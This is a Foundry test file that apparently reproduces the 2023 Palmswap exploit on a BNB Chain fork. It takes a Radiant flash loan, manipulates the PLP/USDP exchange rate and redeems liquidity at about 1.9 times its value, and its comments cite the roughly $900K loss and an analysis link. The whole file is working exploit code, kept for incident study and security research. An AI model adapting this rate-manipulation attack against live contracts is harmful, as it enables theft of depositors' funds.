// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$900K
// Attacker : https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
// Attack Contract : https://bscscan.com/address/0x55252a6d50bfad0e5f1009541284c783686f7f25
// Vulnerable Contract : https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1
// Attack Tx : https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9

// @Analysis
// https://twitter.com/BlockSecTeam/status/1683680026766737408

interface IVault {
    function buyUSDP(address _receiver) external returns (uint256);

    function sellUSDP(address _receiver) external returns (uint256);
}

interface ILiquidityEvent {
    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);

    function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);
}

contract PalmswapTest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 PLP = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);
    IERC20 USDP = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);
    IVault Vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);
    ILiquidityEvent LiquidityEvent = ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
    IAaveFlashloan RadiantLP = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    address private constant plpManager = 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;
    address private constant fPLP = 0x305496cecCe61491794a4c36D322b42Bb81da9c4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_248_637);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(PLP), "PLP");
        cheats.label(address(USDP), "USDP");
        cheats.label(address(Vault), "Vault");
        cheats.label(address(LiquidityEvent), "LiquidityEvent");
        cheats.label(address(RadiantLP), "RadiantLP");
        cheats.label(plpManager, "plpManager");
        cheats.label(fPLP, "fPLP");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        BUSDT.approve(plpManager, type(uint256).max);
        BUSDT.approve(address(RadiantLP), type(uint256).max);
        PLP.approve(fPLP, type(uint256).max);

        emit log_named_decimal_uint(
            "Attacker balance of BUSDT before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        takeFlashLoanOnRadiant();

        emit log_named_decimal_uint(
            "Attacker balance of BUSDT after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Add liquidity. Exchange rate between USDP and PLP is 1:1
        uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);

        BUSDT.transfer(address(Vault), 2_000_000 * 1e18);
        Vault.buyUSDP(address(this));
        // Remove liquidity. Exchange rate between USDP and PLP is 1:1.9.
        // Attacker is able to exchange for 1.9 times more USDP
        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));

        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
        Vault.sellUSDP(address(this));

        return true;
    }

    function takeFlashLoanOnRadiant() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(BUSDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 3_000_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }
}
